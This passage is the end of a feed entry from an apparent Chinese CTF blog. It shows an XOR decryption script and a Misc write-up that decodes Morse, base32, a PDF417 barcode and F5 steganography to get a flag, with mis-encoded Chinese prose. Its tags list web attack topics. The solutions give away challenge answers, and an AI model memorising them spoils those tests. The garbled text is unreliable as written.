p*q*might_s[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">key = <span class="number">42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276</span></span><br><span class="line">dec = key^enc</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br><span class="line">mask = int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec = (dec ^ dec&gt;&gt;<span class="number">200</span>)&amp;mask</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br></pre></td></tr></table></figure><h2 id="Misc-code-in-morse"><a href="#Misc-code-in-morse" class="headerlink" title="Misc-code_in_morse"></a>Misc-code_in_morse</h2><p>è€ƒå¯ŸåŸºæœ¬çš„æµé‡åˆ†æã€morseç¼–ç ï¼Œbase32è§£ç è½¬å›¾ç‰‡ï¼ŒPDF417å›¾ç‰‡çš„è¯†åˆ«ä»¥åŠF5éšå†™ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-8"><a href="#é¢˜ç›®åˆ†æ-8" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‹¿åˆ°æµé‡åŒ…ä¹‹åå¯¼å‡º<code>HTTP</code>æ•°æ®ï¼Œå‘ç°ä¸€å…±å››ä¸ªæ–‡ä»¶ï¼Œåœ¨<code>PNG</code>æ–‡ä»¶ä¸­æ‹¿åˆ°äº†morseç ï¼Œåˆ°ç½‘ç«™è§£ç å¾—åˆ°ä¸€ä¸²base32ç ï¼Œè¿™ä¸ªæ—¶å€™åˆ°ç½‘ç«™ä¸Šè§£base32è§£ä¸å‡ºæ¥ï¼Œå°±ç”¨pythonè§£äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€å †hexï¼Œå…¶ä¸­è¿˜æœ‰<code>PNG</code>å­—æ ·ï¼Œæ–­å®šæ˜¯å›¾ç‰‡çš„æ•°æ®ï¼Œå†™äº†ä¸ªè„šæœ¬å¯¼å…¥åˆ°<code>png</code>å›¾ç‰‡ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">b32 = <span class="string">"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA===="</span></span><br><span class="line">hex = base64.b32decode(b32)</span><br><span class="line">print(hex)</span><br><span class="line">f1 = open(<span class="string">"1.png"</span>,<span class="string">'wb'</span>)</span><br><span class="line">f1.write(hex)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°äº†å¦‚ä¸‹ä¸€å¼ å›¾ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu23.png" alt=""><br>åæ¥å¾—çŸ¥æ˜¯<code>PDF417</code>ï¼Œç„¶ååˆ°ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æ‰«æçš„æ–¹æ³•ï¼Œ<a href="https://online-barcode-reader.inliteresearch.com/">è¿™é‡Œ</a>å’Œ<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">è¿™é‡Œ</a>éƒ½å¯ä»¥è¯†åˆ«ï¼Œè¯†åˆ«å‡ºäº†ä¸‹é¢è¿™ä¸ªå›¾ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu24.jpg" alt=""><br>è¿™é‡Œå¡äº†å¥½ä¹…ï¼Œè¦ä¸æ˜¯å°±æ‹¿åˆ°äº†äºŒè¡€äº†â€¦<br>åæ¥çœ‹åˆ°å›¾ç‰‡çš„æ ‡é¢˜<code>F5</code>å¾—çŸ¥æ˜¯<code>F5</code>éšå†™ï¼Œç„¶åç”¨<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>è·‘å‡ºäº†flagã€‚<br><img src="http://www.ggb0n.cool/images/ichunqiu1.png" alt=""></p><p>è¿™é‡Œå¶ç„¶é—´å‘ç°äº†ä¸€ä¸ªæ›´å¥½ç”¨çš„å·¥å…·ï¼Œè¾“å…¥morseç å°±ç›´æ¥å‡ºäº†PDF417çš„å›¾ï¼Œåˆ†äº«ä¸€ä¸‹ï¼š<a href="https://gchq.github.io/CyberChef/">CyberChef</a>ï¼Œåªèƒ½è¯´ï¼Œå¸ˆå‚…ä»¬tql!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ 
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="SQLæ³¨å…¥" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ååºåˆ—åŒ–æ¼æ´" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="ååºåˆ—åŒ–é€ƒé€¸æ¼æ´" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="SSRF" scheme="http://ggb0n.cool/tags/SSRF/"/>
    
      <category term="å †å æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="RSAæ”»å‡»" scheme="http://ggb0n.cool/tags/RSA%E6%94%BB%E5%87%BB/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
      <category term="RSAå…±æ¨¡æ”»å‡»" scheme="http://ggb0n.cool/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    
      <category term="æ—¶é—´ç›²æ³¨" scheme="http://ggb0n.cool/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    
      <category term="å®½å­—èŠ‚æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="åˆ©ç”¨æ­£åˆ™æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/"/>
    
      <category term="åˆ©ç”¨Handleræ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8Handler%E6%B3%A8%E5%85%A5/"/>
    
      <category term="åˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œå †å æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%88%A9%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
      <category term="å¤šåˆ—æ•°æ®çˆ†ç ´æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%A4%9A%E5%88%97%E6%95%B0%E6%8D%AE%E7%88%86%E7%A0%B4%E6%B3%A8%E5%85%A5/"/>
    
      <category term="PDF417è¯†åˆ«" scheme="http://ggb0n.cool/tags/PDF417%E8%AF%86%E5%88%AB/"/>
    
      <category term="F5éšå†™" scheme="http://ggb0n.cool/tags/F5%E9%9A%90%E5%86%99/"/>
    
      <category term="ThinkPHP6.0-é€šè¿‡SEESIONå†™æ–‡ä»¶æ¼æ´" scheme="http://ggb0n.cool/tags/ThinkPHP6-0-%E9%80%9A%E8%BF%87SEESION%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Rabinç®—æ³•æ”»å‡»" scheme="http://ggb0n.cool/tags/Rabin%E7%AE%97%E6%B3%95%E6%94%BB%E5%87%BB/"/>
    
      <category term="JSåŸå‹é“¾æ±¡æŸ“" scheme="http://ggb0n.cool/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
      <category term="CRLFæ³¨å…¥" scheme="http://ggb0n.cool/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JavaScript" scheme="http://ggb0n.cool/tags/JavaScript/"/>
    
      <category term="NodeJS" scheme="http://ggb0n.cool/tags/NodeJS/"/>
    
      <category term="NodeJSç¼–ç å®‰å…¨" scheme="http://ggb0n.cool/tags/NodeJS%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
